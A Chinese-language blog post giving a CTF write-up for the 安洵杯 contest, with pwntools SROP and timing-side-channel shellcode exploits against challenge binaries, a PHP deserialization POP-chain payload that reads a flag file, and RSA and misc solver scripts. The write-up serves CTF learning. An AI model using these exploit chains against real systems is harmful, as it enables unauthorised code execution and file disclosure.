<!DOCTYPE html><html lang="zh"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>安洵杯wp-LVVLRkMt | shimmer's blog</title><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 共 $1 行","copy":"复制","copyFinish":"完成","expand":"展开"}}</script><script src="//unpkg.com/valine/dist/Valine.min.js"></script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><script>mermaid.initialize({
 startOnLoad: true
 , theme: 'dark'
});</script><link rel="stylesheet" href="/css/arknights.css"><link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.6.0/styles/atom-one-dark-reasonable.min.css"><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body style="background-image:url(https://pica.zhimg.com/80/v2-521231b4ebe13d5fbfff75e801045ff2_1440w.webp?source=1940ef5c);"><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><ol class="navContent"><li class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></li><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav><div class="search-popup"><div id="search-result"></div></div></header><article><div id="post-bg"><div id="post-title"><h1>安洵杯wp-LVVLRkMt</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-12-23T14:15:19.000Z" id="date"> 2023-12-23</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-12-25T04:19:32.569Z" id="updated"> 2023-12-25</time></div></span></div></div><hr><div id="post-content"><p>安洵杯wp-LVVLRkMt</p>
<p><img src="https://raw.githubusercontent.com/shimmer123456/img/main/img/202312251211087.PNG"></p>
<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="side-channel-initiate"><a href="#side-channel-initiate" class="headerlink" title="side_channel , initiate!"></a><strong>side_channel , initiate!</strong></h2><p>思路OR缺W，打一个侧信道逐位爆破</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<span class="hljs-comment">#,log_level=&#x27;debug&#x27;)</span><br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> string<br><br>fstr=<span class="hljs-string">&#x27;-0123456789abcdefghijklmnopqrstuvwxyz&#x27;</span><br><br>mov_rax_f_ret=<span class="hljs-number">0x401193</span><br>syscall=<span class="hljs-number">0x40118A</span><br>bss=<span class="hljs-number">0x404060</span><br>saddr=<span class="hljs-number">0x405000</span><br>leave_ret=<span class="hljs-number">0x401446</span><br>start=<span class="hljs-number">0x404000</span><br><br>sig=SigreturnFrame()<br>sig.rax=<span class="hljs-number">0xa</span><br>sig.rdi=start<br>sig.rsi=<span class="hljs-number">0x2000</span><br>sig.rdx=<span class="hljs-number">0x7</span><br>sig.rsp=bss+<span class="hljs-number">0x200</span><br>sig.rip=syscall<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>(<span class="hljs-params">io,index,ch</span>):<br>    shellcode=<span class="hljs-string">b&#x27;\x90&#x27;</span>*<span class="hljs-number">0x20</span><br>    shellcode+=asm(shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag&#x27;</span>))<br>    shellcode+=asm(shellcraft.read(<span class="hljs-number">3</span>,<span class="hljs-string">&#x27;rsp&#x27;</span>,<span class="hljs-number">0x50</span>))<br>    shellcode+=asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    loop:</span><br><span class="hljs-string">    cmp byte ptr[rsi+&#123;0&#125;],&#123;1&#125;</span><br><span class="hljs-string">    jz loop</span><br><span class="hljs-string">    ret</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>.<span class="hljs-built_in">format</span>(index,ch))<br>    sig2=SigreturnFrame()<br>    sig2.rax=<span class="hljs-number">0x0</span><br>    sig2.rdi=<span class="hljs-number">0x0</span><br>    sig2.rsi=saddr<br>    sig2.rdx=<span class="hljs-built_in">len</span>(shellcode)<br>    sig2.rsp=bss+<span class="hljs-number">0x400</span><br>    sig2.rip=syscall<br>    io.recvuntil(<span class="hljs-string">b&#x27;easyhack\n&#x27;</span>)<br>    payload=<span class="hljs-string">b&#x27;flag&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)+flat(mov_rax_f_ret,syscall)+<span class="hljs-built_in">bytes</span>(sig)<br>    payload=payload.ljust(<span class="hljs-number">0x200</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    payload+=flat(<span class="hljs-number">0</span>,mov_rax_f_ret,syscall)+<span class="hljs-built_in">bytes</span>(sig2)<br>    payload=payload.ljust(<span class="hljs-number">0x400</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    payload+=flat(<span class="hljs-number">0</span>,saddr)<br>    <span class="hljs-comment">#gdb.attach(io)</span><br>    io.sendline(payload)<br>    io.recvuntil(<span class="hljs-string">b&#x27;Do u know what is SUID?\n&#x27;</span>)<br>    payload=flat(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x2a</span>,bss,leave_ret)<br>    io.send(payload)<br>    io.send(shellcode)<br>    <span class="hljs-comment">#io.interactive()</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    flag=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x30</span>):<br>       <span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> fstr:<br>           <span class="hljs-comment">#io=process(&#x27;./ax_shc&#x27;)</span><br>           io=remote(<span class="hljs-string">&#x27;47.108.206.43&#x27;</span>,<span class="hljs-number">41376</span>)<br>           <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;testing ch &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(ch))<br>           pwn(io,i,<span class="hljs-built_in">ord</span>(ch))<br>           start=time.time()<br>           <span class="hljs-keyword">try</span>:<br>               io.recv(timeout=<span class="hljs-number">5</span>)<br>           <span class="hljs-keyword">except</span>:<br>               <span class="hljs-keyword">pass</span><br>           end=time.time()<br>           io.close()<br>           <span class="hljs-keyword">if</span> end-start&gt;<span class="hljs-number">4.5</span>:<br>               flag+=ch<br>               <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27; find flag: &#x27;</span>,flag)<br>               <span class="hljs-keyword">break</span><br>           <br></code></pre></td></tr></table></figure>

<h2 id="Seccomp"><a href="#Seccomp" class="headerlink" title="Seccomp"></a>Seccomp</h2><p>SROP+ORW解决</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>mov_rax_f_ret=<span class="hljs-number">0x401193</span><br>flagaddr=<span class="hljs-number">0x405000</span><br>syscall=<span class="hljs-number">0x40118A</span><br>bss=<span class="hljs-number">0x404060</span><br>saddr=<span class="hljs-number">0x405000</span><br>leave_ret=<span class="hljs-number">0x40143C</span><br>start=<span class="hljs-number">0x404000</span><br><br><span class="hljs-comment">#io=remote(&#x27;</span><br>io=process(<span class="hljs-string">&#x27;./ax_seccomp&#x27;</span>)<br><br>sig=SigreturnFrame()<br>sig.rax=<span class="hljs-number">0x2</span><br>sig.rdi=bss<br>sig.rsi=<span class="hljs-number">0</span><br>sig.rsp=bss+<span class="hljs-number">0x200</span><br>sig.rip=syscall<br><br>sig2=SigreturnFrame()<br>sig2.rax=<span class="hljs-number">0</span><br>sig2.rdi=<span class="hljs-number">3</span><br>sig2.rsi=saddr<br>sig2.rdx=<span class="hljs-number">0x50</span><br>sig2.rsp=bss+<span class="hljs-number">0x400</span><br>sig2.rip=syscall<br><br>sig3=SigreturnFrame()<br>sig3.rax=<span class="hljs-number">1</span><br>sig3.rdi=<span class="hljs-number">1</span><br>sig3.rsi=saddr<br>sig3.rdx=<span class="hljs-number">0x50</span><br>sig3.rsp=bss+<span class="hljs-number">0x600</span><br>sig3.rip=syscall<br><br>payload=<span class="hljs-string">b&#x27;flag&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)+flat(mov_rax_f_ret,syscall)+<span class="hljs-built_in">bytes</span>(sig)<br>payload=payload.ljust(<span class="hljs-number">0x200</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload+=flat(<span class="hljs-number">0</span>,mov_rax_f_ret,syscall)+<span class="hljs-built_in">bytes</span>(sig2)<br>payload=payload.ljust(<span class="hljs-number">0x400</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload+=flat(<span class="hljs-number">0</span>,mov_rax_f_ret,syscall)+<span class="hljs-built_in">bytes</span>(sig3)<br>io.recvuntil(<span class="hljs-string">b&#x27;easyhack\n&#x27;</span>)<br><br>io.sendline(payload)<br><br>io.recvuntil(<span class="hljs-string">b&#x27;Do u know what is SUID?\n&#x27;</span>)<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x2a</span>+flat(bss,leave_ret)<br><span class="hljs-comment">#gdb.attach(io)</span><br>io.send(payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>

<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="what’s-my-name"><a href="#what’s-my-name" class="headerlink" title="what’s my name"></a>what’s my name</h2><p>本地搭建echo $miao发现lambda自增,那第二个if完全可控</p>
<p><img src="https://raw.githubusercontent.com/shimmer123456/img/main/img/202312251215099.png"></p>
<p><img src="https://raw.githubusercontent.com/shimmer123456/img/main/img/202312251215771.png"></p>
<h2 id="easy-unserialize"><a href="#easy-unserialize" class="headerlink" title="easy_unserialize"></a>easy_unserialize</h2><p>__wakeup-&gt;__unset-&gt;__isset-&gt;__toString-&gt;__invoke</p>
<p>empty触发isset</p>
<p>preg_match触发toString</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Good</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$g1</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$gg2</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$ggg3</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;gg2 = <span class="hljs-variable">$ggg3</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__isset</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/a-zA-Z0-9~-=!\^\+\(\)/&quot;</span>,<span class="hljs-variable">$this</span>-&gt;gg2))<br>        &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;gg2)<br>            &#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;g1-&gt;g1=<span class="hljs-number">666</span>;<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;No&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Luck</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$l1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ll2</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$md5</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$lll3</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;md5 = <span class="hljs-variable">$a</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$new</span> = <span class="hljs-variable language_">$this</span>-&gt;l1;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$new</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;ll2-&gt;<span class="hljs-title function_ invoke__">ll2</span>(<span class="hljs-string">&#x27;b2&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unset</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;md5)) == <span class="hljs-number">666</span>)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable language_">$this</span>-&gt;lll3-&gt;lll3))&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;There is noting&quot;</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">To</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$t1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$tt2</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$arg1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span>,<span class="hljs-variable">$arg2</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$this</span>-&gt;arg1)===<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$this</span>-&gt;arg1))<br>        &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;t1;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span>,<span class="hljs-variable">$arg2</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;tt2-&gt;tt2)<br>        &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;what are you doing?&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">You</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$y1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;y1-&gt;y1);<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;May be you can get what you want here&quot;</span>;<br>        <span class="hljs-title function_ invoke__">array_walk</span>(<span class="hljs-variable">$this</span>, function (<span class="hljs-variable">$one</span>, <span class="hljs-variable">$two</span>) &#123;<br>            <span class="hljs-variable">$three</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable">$two</span>(<span class="hljs-variable">$one</span>);<br>            <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$three</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$tmp</span>)&#123;<br>                <span class="hljs-keyword">echo</span> (<span class="hljs-variable">$tmp</span>.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br>            &#125;<br>        &#125;);<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$flag</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Flag</span>();<br><span class="hljs-comment">//$flag-&gt;DirectoryIterator = &#x27;/&#x27;;</span><br><span class="hljs-variable">$flag</span>-&gt;<span class="hljs-built_in">SplFileObject</span> = <span class="hljs-string">&#x27;/FfffLlllLaAaaggGgGg&#x27;</span>;<br><span class="hljs-variable">$luck</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Luck</span>(<span class="hljs-string">&#x27;ukfc&#x27;</span>);<br><span class="hljs-variable">$luck</span>-&gt;l1 = <span class="hljs-variable">$flag</span>;<br><span class="hljs-variable">$good</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Good</span>(<span class="hljs-variable">$luck</span>);<br><span class="hljs-variable">$luck2</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Luck</span>(<span class="hljs-number">213</span>);<br><span class="hljs-variable">$luck2</span>-&gt;lll3 = <span class="hljs-variable">$good</span>;<br><span class="hljs-variable">$you</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">You</span>();<br><span class="hljs-variable">$you</span>-&gt;y1 = <span class="hljs-variable">$luck2</span>;<br><span class="hljs-comment">//$a = serialize($you);</span><br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$you</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;</span><br><span class="hljs-string">&#x27;</span>;<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure>

<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="010101"><a href="#010101" class="headerlink" title="010101"></a><strong>010101</strong></h2><ul>
<li>nc得到三个参数npc</li>
<li>然后看逻辑就是p替换了两个bit输出来了，爆破就行了【这个地方比赛环境当时有点问题，我卡了有半个小时，脚本没动，数据不对】</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> invert<br><br>n = <br>s = <span class="hljs-string">&#x27;1101100101111101001110011011001110011101111100000010100010100010110110100000001001110011111...&#x27;</span><br>c = <br>e = <span class="hljs-number">0x10001</span><br>s1 = s[:<span class="hljs-number">1024</span>]<br>s2 = s[<span class="hljs-number">1024</span>:]<br><span class="hljs-built_in">print</span>(s1)<br><span class="hljs-built_in">print</span>(s2)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(s1)):<br>    <span class="hljs-keyword">if</span> s1[i] == <span class="hljs-string">&#x27;0&#x27;</span>:<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(s2)):<br>            <span class="hljs-keyword">if</span> s2[j] == <span class="hljs-string">&#x27;1&#x27;</span>:<br>                temp = s1[:i] + <span class="hljs-string">&#x27;1&#x27;</span> + s1[i+<span class="hljs-number">1</span>:] + s2[:j] + <span class="hljs-string">&#x27;0&#x27;</span> + s2[j+<span class="hljs-number">1</span>:]<br>                p = <span class="hljs-built_in">int</span>(temp, <span class="hljs-number">2</span>)<br>                <span class="hljs-keyword">if</span> n % p == <span class="hljs-number">0</span>:<br>                    q = n //p<br>                    phi = (p-<span class="hljs-number">1</span>) * (q-<span class="hljs-number">1</span>)<br>                    d = invert(e,phi)<br>                    m = <span class="hljs-built_in">pow</span>(c,d,n)<br>                    <span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure>

<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p><img src="https://raw.githubusercontent.com/shimmer123456/img/main/img/202312251215559.png"></p>
<h2 id="Nahida"><a href="#Nahida" class="headerlink" title="Nahida"></a><strong>Nahida</strong></h2><ul>
<li>逆转搞出图片</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-comment"># 打开输入文件和输出文件</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;Nahida!&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> input_file, <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;output.jpg&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> output_file:<br>    <span class="hljs-comment"># 读取输入文件的所有字节</span><br>    data = input_file.read()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> data[::-<span class="hljs-number">1</span>]:<br><br>        output_file.write(<span class="hljs-built_in">int</span>.to_bytes(((i &gt;&gt; <span class="hljs-number">4</span>) | (i &lt;&lt; <span class="hljs-number">4</span>))&amp;<span class="hljs-number">0xff</span>) )<br></code></pre></td></tr></table></figure>

<p>然后，梭</p>
<p><img src="https://raw.githubusercontent.com/shimmer123456/img/main/img/202312251215761.png"></p>
<h2 id="疯狂的麦克斯"><a href="#疯狂的麦克斯" class="headerlink" title="疯狂的麦克斯"></a><strong>疯狂的麦克斯</strong></h2><ul>
<li>docx变zip，后面文字rot22，加上提示base64</li>
<li>直接把列表所有元素rot22然后base64，再放进去爆破</li>
</ul>
